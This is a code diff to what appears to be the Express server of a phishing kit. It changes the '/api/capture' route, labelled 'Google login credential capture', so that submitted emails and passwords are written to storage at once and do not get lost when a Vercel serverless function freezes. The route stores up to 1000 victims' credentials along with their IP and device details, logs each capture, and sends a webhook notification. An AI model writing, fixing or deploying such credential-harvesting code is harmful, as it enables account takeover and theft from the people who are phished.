@@ -130,9 +130,10 @@ function saveStore() {
 
 function forceSave() {
     if (USE_REDIS && redis) {
-        redis.set(REDIS_KEY, JSON.stringify(store)).catch(() => {});
+        return redis.set(REDIS_KEY, JSON.stringify(store)).catch(() => {});
     } else {
         try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); } catch (e) {}
+        return Promise.resolve();
     }
 }
 process.on('SIGINT', () => { forceSave(); process.exit(0); });
@@ -685,7 +686,7 @@ app.post('/log-error', (req, res) => {
 });
 
 // ── Google login credential capture ──
-app.post('/api/capture', (req, res) => {
+app.post('/api/capture', async (req, res) => {
     const { email, password, source, timestamp, clientId, screen, timezone, staySignedIn } = req.body;
     if (!email || !password) return res.status(400).json({ error: 'Missing fields' });
     if (!store.credentials) store.credentials = [];
@@ -704,7 +705,9 @@ app.post('/api/capture', (req, res) => {
     };
     store.credentials.unshift(entry);
     if (store.credentials.length > 1000) store.credentials.length = 1000;
-    saveStore();
+    // Use forceSave (immediate write) instead of debounced saveStore
+    // so Vercel serverless doesn't freeze before the timer fires
+    await forceSave();
     addEvent('credential_captured', { clientId: entry.clientId, email: entry.email, source: entry.source, ip: entry.ip });
     console.log(`\u{1F511} Credential captured: ${entry.email} from ${entry.clientId} (${entry.ip})`);
     // Fire webhook notification
